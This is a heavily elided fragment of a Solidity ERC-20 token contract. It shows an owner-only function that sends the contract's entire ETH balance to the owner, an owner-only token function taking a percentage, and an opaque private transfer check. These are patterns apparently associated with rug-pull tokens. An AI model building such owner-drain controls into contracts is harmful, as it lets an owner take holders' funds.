...
contract Token is Context, IERC20, Ownable {
    ...
    function trumpOrg(address from, address to) private view returns (bool) {
    ...
    function dopeEther() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }
    function dopeToken(address _address, uint256 percent) external onlyOwner {
